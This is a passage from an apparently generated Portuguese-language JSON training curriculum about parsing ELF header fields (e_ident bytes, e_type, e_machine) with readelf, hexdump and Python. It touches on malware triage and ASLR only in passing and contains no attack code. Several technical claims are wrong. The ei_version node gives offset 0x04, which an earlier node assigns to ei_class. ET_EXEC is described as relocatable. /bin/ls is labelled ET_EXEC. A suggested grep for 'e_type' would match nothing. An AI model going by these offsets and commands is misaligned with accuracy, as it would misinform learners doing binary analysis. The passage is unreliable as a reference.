                                    "Abra um binário ELF em um editor hex (ex: xxd, hexedit).",
                                    "Navegue para o início do arquivo e identifique o magic number (7F 45 4C 46).",
                                    "Conte 4 bytes após o magic para ei_class (offset 0x04) e 5 bytes para ei_data (offset 0x05).",
                                    "Extraia os valores em decimal/hex e anote-os.",
                                    "Repita com pelo menos 3 arquivos ELF diferentes (32-bit e 64-bit)."
                                  ],
                                  "verification": "Capture screenshot ou liste os valores extraídos de um hex dump.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Editor hex (xxd, HxD), amostras ELF (ls -l /bin/* | grep elf).",
                                  "tips": "Use 'readelf -h arquivo' para validar extração manual.",
                                  "learningObjective": "Localizar precisamente ei_class e ei_data em qualquer binário ELF.",
                                  "commonMistakes": "Errar offset após magic number; confundir bytes adjacentes."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interpretar os Valores e Determinar Arquitetura e Endianness",
                                  "subSteps": [
                                    "Mapeie ei_class: 1 → 32-bit (endereços 4 bytes), 2 → 64-bit (8 bytes).",
                                    "Mapeie ei_data: 1 → little-endian (ler low-byte primeiro), 2 → big-endian.",
                                    "Combine: ex. ei_class=2, ei_data=1 → 64-bit little-endian (comum em x86_64 Linux).",
                                    "Anote implicações: tamanho de e_entry, e_phoff dependem disso.",
                                    "Teste interpretação com readelf para confirmação."
                                  ],
                                  "verification": "Crie tabela resumindo valores extraídos e suas interpretações.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Amostras ELF variadas, comando readelf.",
                                  "tips": "Sempre confirme com 'file arquivo' ou readelf para cross-check.",
                                  "learningObjective": "Mapear valores de bytes para configurações de arquitetura e endianness.",
                                  "commonMistakes": "Assumir sempre little-endian; ignorar que afeta parsing posterior."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Interpretação para Ler Corretamente o Resto do Cabeçalho",
                                  "subSteps": [
                                    "Baseado em ei_class/ei_data, ajuste leitura de campos multi-byte (ex: e_type em 16-bit).",
                                    "Use Python ou C para parse manual: leia e_type considerando endianness.",
                                    "Compare parse manual com readelf/objdump.",
                                    "Identifique erros se endianness errada (ex: e_type=0x0200 vira 0x0002).",
                                    "Documente um caso onde interpretação errada quebra o header."
                                  ],
                                  "verification": "Script ou output mostrando parse correto vs. incorreto.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Python com struct module, amostras ELF, readelf.",
                                  "tips": "Em Python: struct.unpack('>H' if big-endian else '<H', data).",
                                  "learningObjective": "Aplicar ei_class/ei_data para parsing preciso de campos subsequentes.",
                                  "commonMistakes": "Ler todos campos como little-endian por default; esquecer ajuste de tamanho."
                                }
                              ],
                              "practicalExample": "Em um ELF 64-bit little-endian (/bin/ls): hex dump mostra offset 0x04=02 (ei_class=2→64-bit), 0x05=01 (ei_data=1→little). Parse e_entry como uint64 little-endian resulta em endereço correto 0x4010b0; se big-endian, vira inválido.",
                              "finalVerifications": [
                                "Lista corretamente valores e significados de ei_class e ei_data.",
                                "Extrai e interpreta bytes de 3+ binários ELF variados.",
                                "Ajusta parsing de e_type/e_entry baseado em endianness e largura.",
                                "Identifica discrepâncias entre parse manual e readelf.",
                                "Explica impacto em análise de segurança (ex: ROP gadgets em 32 vs 64-bit).",
                                "Cria tabela de mapeamento para arquitetura/Endianness."
                              ],
                              "assessmentCriteria": [
                                "Precisão na localização e extração de bytes (100% correto).",
                                "Interpretação sem erros de mapeamento de valores.",
                                "Aplicação correta em parsing de campos dependentes.",
                                "Uso de ferramentas para validação (readelf/file).",
                                "Explicação clara de implicações para o cabeçalho inteiro.",
                                "Identificação de erros comuns em cenários cross-platform."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Endianness e largura de registradores.",
                                "Programação: Uso de struct.pack/unpack para binários portáteis.",
                                "Segurança da Informação: Análise de malware em binários ELF cross-arq.",
                                "Engenharia de Software: Parsing de formatos binários em tools como IDA Pro."
                              ],
                              "realWorldApplication": "Em reverse engineering de malware ELF, determinar 32/64-bit e endianness permite parse correto de seções para encontrar payloads; essencial em forensics digitais, desenvolvimento de loaders customizados e análise de vulnerabilidades em firmwares embarcados."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.2.1.3",
                            "name": "Analisar ei_version e ei_osabi",
                            "description": "Verificar ei_version (geralmente 1 para versão atual do ELF) e ei_osabi (identificador do sistema operacional/ABI como Linux, FreeBSD) para garantir compatibilidade e identificar o ambiente de execução pretendido.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e acessar o cabeçalho e_ident do arquivo ELF",
                                  "subSteps": [
                                    "Instale ferramentas essenciais como readelf, hexdump ou xxd em um ambiente Linux.",
                                    "Selecione um arquivo ELF de exemplo (ex: /bin/ls) e confirme que é um binário ELF válido usando o comando 'file'.",
                                    "Abra o arquivo em um editor hexadecimal ou use 'readelf -h' para visualizar o cabeçalho.",
                                    "Localize o array e_ident nos primeiros 16 bytes do arquivo (offset 0x00 a 0x0F).",
                                    "Anote os offsets específicos: ei_version em byte 4 (offset 0x04), ei_osabi em byte 7 (offset 0x07)."
                                  ],
                                  "verification": "Visualize o cabeçalho com readelf -h e confirme que o magic number é 7F 45 4C 46 (ELF).",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramentas: readelf, hexdump, xxd ou editor hex como bless/hexedit",
                                    "Arquivo ELF de teste (ex: /bin/ls)"
                                  ],
                                  "tips": "Use 'xxd arquivo.elf | head' para uma visão rápida dos primeiros bytes sem sobrecarregar a tela.",
                                  "learningObjective": "Configurar um ambiente de análise ELF e identificar a estrutura inicial do e_ident.",
                                  "commonMistakes": [
                                    "Confundir com formato PE (Windows), que inicia com MZ",
                                    "Ignorar endianness ao visualizar bytes",
                                    "Usar arquivos corrompidos sem validar com 'file'"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Extrair e interpretar o campo ei_version",
                                  "subSteps": [
                                    "Extraia o byte no offset 0x04 usando hexdump -C arquivo.elf | head -1 ou readelf -h.",
                                    "Converta o valor hexadecimal para decimal: geralmente 0x01 (1) indica versão atual.",
                                    "Valide se ei_version == 1; valores maiores indicam versões experimentais ou futuras.",
                                    "Pesquise na especificação ELF (ex: man elf) o significado de outros valores possíveis.",
                                    "Registre o valor e sua implicação para compatibilidade do parser."
                                  ],
                                  "verification": "Confirme que ei_version é 1 em um binário padrão Linux com readelf -h | grep 'Version'.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Comando readelf",
                                    "Especificação ELF oficial (PDF ou man page)",
                                    "Editor de texto para anotações"
                                  ],
                                  "tips": "ei_version raramente muda; foque em validação rápida para eficiência em análises em massa.",
                                  "learningObjective": "Identificar e validar a versão ELF para garantir suporte do analisador.",
                                  "commonMistakes": [
                                    "Interpretar como little-endian multi-byte (é single byte)",
                                    "Ignorar que 0 significa 'invalido'",
                                    "Confundir com e_version no header principal"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Extrair e interpretar o campo ei_osabi",
                                  "subSteps": [
                                    "Extraia o byte no offset 0x07 usando hexdump ou readelf -h.",
                                    "Mapeie o valor: 0=System V, 3=Linux (GNU), 9=FreeBSD, etc. (consulte tabela ELF spec).",
                                    "Identifique o sistema operacional/ABI pretendido e anote possíveis variações (ex: ARM vs x86).",
                                    "Compare com o ambiente host atual usando 'uname -s' para detectar mismatches.",
                                    "Documente implicações, como bibliotecas dinâmicas específicas do OS."
                                  ],
                                  "verification": "Use readelf -h e confirme 'OS/ABI' (ex: GNU/Linux para 3).",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Tabela de OS/ABI da spec ELF (disponível online)",
                                    "Comandos uname e readelf"
                                  ],
                                  "tips": "Memorize valores comuns: 3=Linux é o mais frequente em distribuições modernas.",
                                  "learningObjective": "Determinar o target OS/ABI para avaliar portabilidade e riscos de execução.",
                                  "commonMistakes": [
                                    "Confundir ei_osabi com e_machine (arquitetura)",
                                    "Ignorar ABIs estendidos >127",
                                    "Assumir sempre Linux sem verificar"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar compatibilidade e documentar achados",
                                  "subSteps": [
                                    "Compare ei_version e ei_osabi com seu ambiente (ex: Linux x86_64).",
                                    "Teste execução condicional: use qemu ou chroot se mismatch.",
                                    "Gere um relatório resumindo valores, compatibilidade e riscos (ex: binário FreeBSD em Linux).",
                                    "Automatize com script Python usando struct para parse e_ident.",
                                    "Valide com múltiplos arquivos ELF para padrões."
                                  ],
                                  "verification": "Crie um relatório que afirme 'Compatível: sim/não' baseado nos valores.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Python com módulo struct",
                                    "QEMU para emulação",
                                    "Template de relatório Markdown"
                                  ],
                                  "tips": "Em segurança, mismatches indicam potenciais binários maliciosos cross-platform.",
                                  "learningObjective": "Integrar análises de ei_version/ei_osabi em workflow de compatibilidade.",
                                  "commonMistakes": [
                                    "Executar binários incompatíveis sem sandbox",
                                    "Omitir documentação de riscos",
                                    "Ignorar atualizações na spec ELF"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um sistema Ubuntu, execute 'readelf -h /bin/ls': observe 'Version: 1 (current)' para ei_version e 'OS/ABI: UNIX - System V' ou 'GNU/Linux' para ei_osabi=3. Se ei_osabi=9 (FreeBSD), evite execução direta e use análise estática.",
                              "finalVerifications": [
                                "ei_version é 1 em binários padrão.",
                                "ei_osabi corresponde ao SO esperado (ex: 3 para Linux).",
                                "Compatibilidade confirmada com ambiente host.",
                                "Relatório documenta valores hex/decimais e implicações.",
                                "Teste com pelo menos 3 arquivos ELF diferentes.",
                                "Script Python parseia corretamente e_ident."
                              ],
                              "assessmentCriteria": [
                                "Identificação precisa dos offsets 0x04 e 0x07.",
                                "Interpretação correta de valores (ex: 1=atual, 3=Linux).",
                                "Análise de compatibilidade com justificativa.",
                                "Uso adequado de ferramentas sem erros de sintaxe.",
                                "Relatório completo com riscos destacados.",
                                "Automação básica via script demonstrada."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Entender ABIs e portabilidade.",
                                "Segurança Computacional: Detectar binários suspeitos por mismatch OS.",
                                "Programação em C/Python: Implementar parsers ELF personalizados.",
                                "Análise Reversa: Integração com ferramentas como Ghidra/IDA Pro.",
                                "Redes/Forense: Verificação em capturas de tráfego com payloads ELF."
                              ],
                              "realWorldApplication": "Na análise de malware, verificar ei_osabi garante que binários Linux não sejam executados acidentalmente em Windows, prevenindo infecções; em DevOps, valida cross-compilação para containers Docker multi-plataforma."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.2.2",
                        "name": "e_type - Tipo de Arquivo ELF",
                        "description": "O campo e_type (2 bytes) define o tipo do arquivo ELF, como relocável (objeto), executável, compartilhado (biblioteca dinâmica) ou core dump, crucial para entender o propósito e o carregamento do binário.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.2.2.1",
                            "name": "Listar e Decodificar Valores de e_type",
                            "description": "Memorizar e interpretar valores como ET_NONE (0), ET_REL (1 - objeto relocável), ET_EXEC (2 - executável), ET_DYN (3 - compartilhado), ET_CORE (4 - dump de memória), usando ferramentas como readelf ou hexdump.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Memorizar os valores e significados de e_type",
                                  "subSteps": [
                                    "Liste os valores principais: ET_NONE (0), ET_REL (1 - objeto relocável), ET_EXEC (2 - executável), ET_DYN (3 - biblioteca compartilhada), ET_CORE (4 - dump de core).",
                                    "Crie um mnemônico ou tabela para associar números a tipos (ex: 0=Nada, 1=Relocável, 2=Executável, 3=Dinâmico, 4=Core).",
                                    "Repita a lista em voz alta ou escreva 5 vezes, testando recall sem consultar notas.",
                                    "Explique em suas palavras o propósito de cada tipo em um pipeline de build/linkagem.",
                                    "Compare com formatos não-ELF brevemente para reforçar unicidade."
                                  ],
                                  "verification": "Recite todos os 5 valores e significados corretamente sem erros em uma autoavaliação.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Papel e caneta ou editor de texto simples, tabela de referência ELF (man elf ou online docs).",
                                  "tips": "Use flashcards digitais como Anki para repetição espaçada.",
                                  "learningObjective": "Dominar a memorização e compreensão conceitual dos valores de e_type.",
                                  "commonMistakes": "Confundir ET_DYN com ET_EXEC (um é lib compartilhada, outro executável standalone); ignorar ET_CORE como irrelevante."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar e usar readelf para inspecionar e_type",
                                  "subSteps": [
                                    "Instale binutils se necessário: sudo apt install binutils em Linux.",
                                    "Execute 'readelf -h /bin/ls' e identifique a seção e_type no cabeçalho.",
                                    "Anote o valor hexadecimal e mapeie para o tipo correspondente (ex: 0x2 = ET_EXEC).",
                                    "Teste em múltiplos arquivos: /bin/ls (EXEC), /lib/x86_64-linux-gnu/libc.so.6 (DYN), um .o compilado (REL).",
                                    "Compare saídas com documentação oficial ELF para validar."
                                  ],
                                  "verification": "Gere saída de readelf mostrando e_type corretamente decodificado para 3 arquivos diferentes.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Sistema Linux com terminal, binutils instalado, arquivos ELF padrão (/bin/*, /lib/*).",
                                  "tips": "Use 'readelf -h arquivo | grep e_type' para filtrar rapidamente.",
                                  "learningObjective": "Aplicar ferramenta readelf para extrair e interpretar e_type automaticamente.",
                                  "commonMistakes": "Executar readelf em arquivos não-ELF (falha); confundir e_type com e_machine."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Decodificar e_type manualmente com hexdump",
                                  "subSteps": [
                                    "Use 'hexdump -C /bin/ls | head' para visualizar bytes iniciais do cabeçalho ELF.",
                                    "Localize o offset de e_type: após EI_NIDENT (16 bytes), e_type é little-endian uint16 nos bytes 16-17.",
                                    "Extraia bytes manualmente (ex: 02 00 -> 0x0002 = ET_EXEC), converta hex para dec e mapeie.",
                                    "Pratique em 3 arquivos variados, calculando manualmente antes de verificar com readelf.",
                                    "Anote discrepâncias potenciais em endianness ou arquiteturas."
                                  ],
                                  "verification": "Decodifique e_type manualmente de um binário e confirme match com readelf -h.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Terminal com hexdump (padrão em Unix), calculadora hex-dec, arquivos ELF de teste.",
                                  "tips": "Lembre: ELF little-endian por padrão em x86; inverta bytes se necessário.",
                                  "learningObjective": "Desenvolver habilidade de análise manual de binários para decodificação low-level.",
                                  "commonMistakes": "Errar offset (e_type inicia em byte 16); ignorar endianness (ler big ao invés de little)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar e integrar conhecimento com cenários reais",
                                  "subSteps": [
                                    "Compile um programa C simples: gcc -c test.c -> test.o (ver REL), gcc test.c -o test (EXEC), ld -shared test.o -o test.so (DYN).",
                                    "Analise cada etapa com readelf e hexdump, decodificando e_type.",
                                    "Simule dump de core com 'kill -ABRT $$' e verifique ET_CORE.",
                                    "Crie um script bash que detecta tipo via e_type e classifica arquivos.",
                                    "Teste em binários suspeitos (ex: malware samples de repositórios públicos)."
                                  ],
                                  "verification": "Classifique corretamente 5 binários customizados/estándard usando ambos métodos.",
                                  "estimatedTime": "35 minutos",
                                  "materials": "GCC, LD, terminal; exemplos de código C simples; amostras seguras de core dumps.",
                                  "tips": "Automatize verificações com diff entre manual e readelf para precisão.",
                                  "learningObjective": "Integrar memorização, ferramentas e análise manual em fluxos práticos.",
                                  "commonMistakes": "Usar gcc sem flags corretas (ex: -shared para DYN); testar em plataformas não-Linux."
                                }
                              ],
                              "practicalExample": "Em um cenário de análise forense, execute 'readelf -h suspect_binary' e veja e_type=0x3 (ET_DYN), suspeitando de uma DLL injetada; confirme manualmente com hexdump bytes 16-17=03 00, validando como biblioteca compartilhada potencialmente maliciosa.",
                              "finalVerifications": [
                                "Recitar todos os 5 valores de e_type e significados sem hesitação.",
                                "Usar readelf para decodificar e_type em 5 binários variados corretamente.",
                                "Decodificar manualmente e_type via hexdump em 3 binários, matching readelf.",
                                "Classificar tipos em binários customizados (REL, EXEC, DYN, CORE).",
                                "Explicar impacto de e_type em loading dinâmico do linker.",
                                "Detectar anomalias como e_type=0 em executáveis (ET_NONE inválido)."
                              ],
                              "assessmentCriteria": [
                                "Precisão 100% na memorização e mapeamento de valores.",
                                "Proficiência em readelf: saída interpretada corretamente em <1min por arquivo.",
                                "Análise manual precisa, incluindo offset e endianness.",
                                "Integração prática: scripts ou classificações funcionais.",
                                "Compreensão conceitual: explicar diferenças em contextos de segurança.",
                                "Eficiência temporal: completar tarefas dentro de estimados."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: entendimento de linkagem e loaders.",
                                "Sistemas Operacionais: processos de carregamento ELF pelo kernel.",
                                "Segurança/Malware: detecção de binários anômalos via headers.",
                                "Engenharia Reversa: base para ferramentas como Ghidra/IDA Pro.",
                                "Redes: análise de binários em pacotes de exploit."
                              ],
                              "realWorldApplication": "Em cibersegurança, analistas usam isso para triagem rápida de malware (ex: executáveis vs. libs injetadas), forense digital (core dumps em crashes), e auditorias de binários em pipelines CI/CD para prevenir relocáveis não-linkados."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.2.2.2",
                            "name": "Diferenciar Tipos de Arquivos ELF",
                            "description": "Explicar implicações práticas: ET_EXEC para programas standalone, ET_DYN para bibliotecas .so, e como isso afeta análise de malware ou engenharia reversa em contextos de exploração.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Estrutura do Cabeçalho ELF e Localizar e_type",
                                  "subSteps": [
                                    "Baixe ou localize binários ELF de exemplo (ex: /bin/ls e /lib/x86_64-linux-gnu/libc.so.6)",
                                    "Instale e use a ferramenta readelf com comando 'readelf -h <arquivo>' para exibir o cabeçalho",
                                    "Identifique a seção 'Type' no output, que corresponde ao campo e_type",
                                    "Compare com a documentação ELF oficial para confirmar offsets (e_type em offset 16 do cabeçalho)",
                                    "Anote os valores hexadecimais comuns: 0x02 para ET_EXEC, 0x03 para ET_DYN"
                                  ],
                                  "verification": "Execute readelf -h em dois binários diferentes e aponte corretamente o valor de e_type no output",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramenta readelf (pacote binutils)",
                                    "Binários ELF de exemplo (/bin/ls, libc.so.6)",
                                    "Documentação ELF: https://refspecs.linuxfoundation.org/elf/elf.pdf"
                                  ],
                                  "tips": "Sempre especifique a arquitetura com 'readelf -h -W' para evitar problemas de endianness",
                                  "learningObjective": "Compreender a localização e interpretação inicial do campo e_type no cabeçalho ELF",
                                  "commonMistakes": [
                                    "Confundir e_type com e_machine ou e_ident",
                                    "Ignorar o formato little-endian em sistemas x86_64",
                                    "Usar file em vez de readelf para detalhes precisos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Diferenciar ET_EXEC (Executáveis Standalone)",
                                  "subSteps": [
                                    "Pesquise definição: ET_EXEC (valor 2) indica arquivo executável relocável com endereços absolutos",
                                    "Exemplo prático: Compile um programa C simples sem -fPIE/-pie para gerar ET_EXEC",
                                    "Analise com readelf: Verifique se o binário é carregado em endereço fixo (não PIC)",
                                    "Discuta características: Não suporta ASLR completo, entry point absoluto",
                                    "Teste execução: ./programa e observe comportamento em chroot ou sem libs dinâmicas"
                                  ],
                                  "verification": "Compile e analise um binário ET_EXEC, explicando por que ele falha se mover para outro endereço base",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "GCC para compilar: gcc hello.c -o hello -no-pie",
                                    "readelf",
                                    "Ambiente Linux com binutils"
                                  ],
                                  "tips": "Use 'gcc -no-pie' explicitamente para forçar ET_EXEC em versões modernas do GCC",
                                  "learningObjective": "Explicar características e usos de arquivos ELF do tipo ET_EXEC",
                                  "commonMistakes": [
                                    "Assumir que todos executáveis são ET_DYN",
                                    "Confundir com ET_REL (object files)",
                                    "Ignorar flags de compilação como -static"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Diferenciar ET_DYN (Bibliotecas Compartilhadas .so)",
                                  "subSteps": [
                                    "Definição: ET_DYN (valor 3) para shared objects, position-independent code (PIC)",
                                    "Exemplo: Analise libc.so.6 com readelf -h, note 'DYN (Shared object file)'",
                                    "Compile shared lib: gcc -shared -fPIC lib.c -o lib.so",
                                    "Verifique dependências com ldd e entenda dynamic linking em runtime",
                                    "Compare relocações: Use readelf -r para ver diferenças em relocs dinâmicos vs estáticos"
                                  ],
                                  "verification": "Identifique ET_DYN em uma .so, execute ldd nela e explique o papel do dynamic linker",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "GCC com -shared -fPIC",
                                    "ldd",
                                    "readelf -r para relocações",
                                    "libc.so.6 exemplo"
                                  ],
                                  "tips": "ET_DYN também inclui executáveis PIE (Position Independent Executables) com -pie",
                                  "learningObjective": "Distinguir ET_DYN de ET_EXEC e suas implicações em linking dinâmico",
                                  "commonMistakes": [
                                    "Pensar que ET_DYN não pode ser executável (PIE são)",
                                    "Confundir com ET_NONE",
                                    "Não testar com -fPIE"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar Implicações em Análise de Malware e Engenharia Reversa",
                                  "subSteps": [
                                    "Em malware: ET_EXEC sugere dropper standalone; ET_DYN pode ser loader ou DLL-like para injeção",
                                    "RE impacto: ET_EXEC tem entry point fixo (fácil ROP); ET_DYN requer análise de GOT/PLT",
                                    "Exemplo malware: Analise um sample ELF malicioso (ex: de VirusTotal) com readelf",
                                    "Exploração: Teste ASLR bypass em ET_EXEC vs proteção em ET_DYN/PIE",
                                    "Ferramentas avançadas: Use objdump ou Ghidra para confirmar tipo e impactos"
                                  ],
                                  "verification": "Dado um binário desconhecido, classifique e_type e descreva 2 implicações para RE/malware",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Samples de malware ELF (ex: de MalwareBazaar)",
                                    "Ghidra ou radare2",
                                    "VirusTotal para análise inicial"
                                  ],
                                  "tips": "Em RE, sempre cheque PT_DYNAMIC para confirmar loader em ET_DYN",
                                  "learningObjective": "Aplicar diferenciação de tipos ELF em cenários reais de segurança",
                                  "commonMistakes": [
                                    "Subestimar PIE em ET_DYN",
                                    "Ignorar ET_CORE para dumps",
                                    "Não considerar cross-compilation"
                                  ]
                                }
                              ],
                              "practicalExample": "Baixe /bin/ls (ET_EXEC=2): 'readelf -h /bin/ls' mostra executável standalone, ideal para análise estática rápida de malware sem dependências. Para /lib/x86_64-linux-gnu/libc.so.6 (ET_DYN=3): Requer ld.so para carregar, comum em malwares que injetam via LD_PRELOAD, complicando RE devido a relocações dinâmicas.",
                              "finalVerifications": [
                                "Explicar corretamente ET_EXEC=2 vs ET_DYN=3 com valores hexadecimais",
                                "Usar readelf para classificar um binário fornecido em <1 minuto",
                                "Descrever pelo menos duas implicações práticas em análise de malware",
                                "Diferenciar impactos em engenharia reversa (ex: ROP chains em ET_EXEC)",
                                "Identificar se um binário é PIE (ET_DYN executável) via flags",
                                "Explicar papel do dynamic linker em ET_DYN"
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de valores e_type (100% correto)",
                                "Profundidade nas implicações práticas (mínimo 3 exemplos relevantes)",
                                "Uso correto de ferramentas como readelf/ldd em demonstração",
                                "Clareza na distinção entre standalone vs shared objects",
                                "Integração com contextos de segurança (malware/RE)",
                                "Criatividade em exemplos reais ou compilados"
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Mecanismos de carregamento de processos e dynamic linking",
                                "Programação em C/Assembly: Flags de compilação (-pie, -fPIC) e relocações",
                                "Redes e Criptografia: Análise de binários em ataques de supply chain",
                                "Engenharia de Software: Diferenças entre static vs dynamic libraries"
                              ],
                              "realWorldApplication": "Em equipes de Threat Hunting (ex: SOCs), diferenciar ET_EXEC/ET_DYN acelera triage de amostras Linux malware: ET_EXEC para análise rápida de droppers; ET_DYN para investigar loaders em APTs como Fancy Bear. Na engenharia reversa de exploits (ex: Pwn2Own), entender PIC em ET_DYN é crucial para bypass ASLR em binários modernos."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.2.3",
                        "name": "e_machine - Arquitetura da Máquina",
                        "description": "O campo e_machine (2 bytes) especifica a arquitetura alvo (ex: x86, x86-64, ARM), determinando instruções suportadas e garantindo compatibilidade durante carregamento e execução.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.2.3.1",
                            "name": "Identificar Arquiteturas Comuns via e_machine",
                            "description": "Decodificar valores como EM_386 (3 - x86 32-bit), EM_X86_64 (62 - AMD64), EM_ARM (40 - ARM 32-bit), EM_AARCH64 (183 - ARM 64-bit) e associar a ferramentas de disassemblagem apropriadas como objdump.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Localizar e Extrair o Campo e_machine em um Cabeçalho ELF",
                                  "subSteps": [
                                    "Baixe ou crie um arquivo ELF simples usando gcc (ex: gcc -o test.elf test.c).",
                                    "Use hexdump ou xxd para visualizar os primeiros bytes do arquivo: hexdump -C test.elf | head.",
                                    "Identifique o offset do campo e_machine: posição 0x12 (18 em decimal) após o magic number (7F 45 4C 46).",
                                    "Extraia os 2 bytes em little-endian do offset 0x12 e converta para hexadecimal.",
                                    "Anote o valor obtido e prepare para decodificação."
                                  ],
                                  "verification": "Confirme que o valor extraído corresponde ao esperado para a arquitetura do sistema (ex: 0x3E para x86_64 em little-endian).",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramenta hexdump ou xxd",
                                    "Compilador gcc",
                                    "Arquivo ELF de teste"
                                  ],
                                  "tips": "Sempre verifique o endianness: ELF é little-endian por padrão em x86.",
                                  "learningObjective": "Localizar precisamente o campo e_machine no cabeçalho ELF e extrair seu valor bruto.",
                                  "commonMistakes": [
                                    "Confundir offset (use 0x12 exatamente)",
                                    "Ignorar endianness ao ler bytes",
                                    "Ler apenas um byte em vez de dois"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear Valores de e_machine para Arquiteturas Comuns",
                                  "subSteps": [
                                    "Consulte a especificação ELF (ex: man elf ou página da Wikipedia ELF) para valores oficiais.",
                                    "Memorize os principais: EM_386=3 (x86 32-bit), EM_X86_64=62 (AMD64), EM_ARM=40 (ARM 32-bit), EM_AARCH64=183 (ARM 64-bit).",
                                    "Crie uma tabela de referência com valores hex/dec e nomes de arquitetura.",
                                    "Teste com valores extraídos: converta little-endian para decimal/hex e associe.",
                                    "Valide com readelf: readelf -h test.elf | grep Machine."
                                  ],
                                  "verification": "Liste corretamente 4 arquiteturas comuns com seus valores e_machine sem consultar notas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Especificação ELF online",
                                    "Comando readelf",
                                    "Tabela de referência personalizada"
                                  ],
                                  "tips": "Use um script Python simples para converter bytes little-endian: struct.unpack('<H', bytes)[0].",
                                  "learningObjective": "Associar valores numéricos de e_machine a arquiteturas de máquina padrão.",
                                  "commonMistakes": [
                                    "Confundir valores decimais com hex (ex: 62 dec = 0x3E)",
                                    "Misturar ARM 32/64",
                                    "Esquecer de converter endianness"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interpretar e_machine em Binários Reais com Ferramentas",
                                  "subSteps": [
                                    "Baixe binários ELF de diferentes arquiteturas (ex: /bin/ls em x86_64, ARM de emulador).",
                                    "Execute readelf -h em cada um e identifique e_machine manualmente vs. output da ferramenta.",
                                    "Use objdump -f para confirmar arquitetura inferida.",
                                    "Compare manual (hexdump) com ferramentas automatizadas.",
                                    "Registre discrepâncias e resolva."
                                  ],
                                  "verification": "Analise 3 binários diferentes e identifique corretamente a arquitetura via e_machine em <5 minutos cada.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Binários ELF variados (x86, ARM)",
                                    "readelf, objdump",
                                    "Hexdump"
                                  ],
                                  "tips": "Instale binários cross-arch via qemu ou docker para prática.",
                                  "learningObjective": "Aplicar extração e decodificação de e_machine em binários reais usando múltiplas ferramentas.",
                                  "commonMistakes": [
                                    "Assumir arquitetura do host",
                                    "Não verificar se é ELF válido primeiro",
                                    "Ignorar binários stripped"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Associar Arquiteturas a Ferramentas de Disassemblagem Apropriadas",
                                  "subSteps": [
                                    "Para cada arquitetura mapeada: x86_64 -> objdump/ghidra (x86 syntax), ARM -> objdump com --disassembler-options=force-thumb.",
                                    "Teste disassemblagem: objdump -d -M intel binário_x86 para x86_64.",
                                    "Para ARM/AARCH64: objdump -D -b elf32-arm ou elf64-aarch64 conforme e_machine.",
                                    "Identifique sintaxes: Intel/AT&T para x86, Thumb/ARM para ARM.",
                                    "Crie um cheat sheet de flags objdump por e_machine."
                                  ],
                                  "verification": "Execute disassemblagem correta em 2 binários de archs diferentes sem erros de syntax.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "objdump",
                                    "Binários por arquitetura",
                                    "Ghidra ou radare2 opcional"
                                  ],
                                  "tips": "Use -t para symbols e -h para headers antes de disassemblar.",
                                  "learningObjective": "Selecionar e configurar ferramentas de disassemblagem baseadas no e_machine identificado.",
                                  "commonMistakes": [
                                    "Usar flags erradas para arch (ex: disass ARM como x86)",
                                    "Esquecer de especificar endianness",
                                    "Não lidar com big-endian em alguns ARMs"
                                  ]
                                }
                              ],
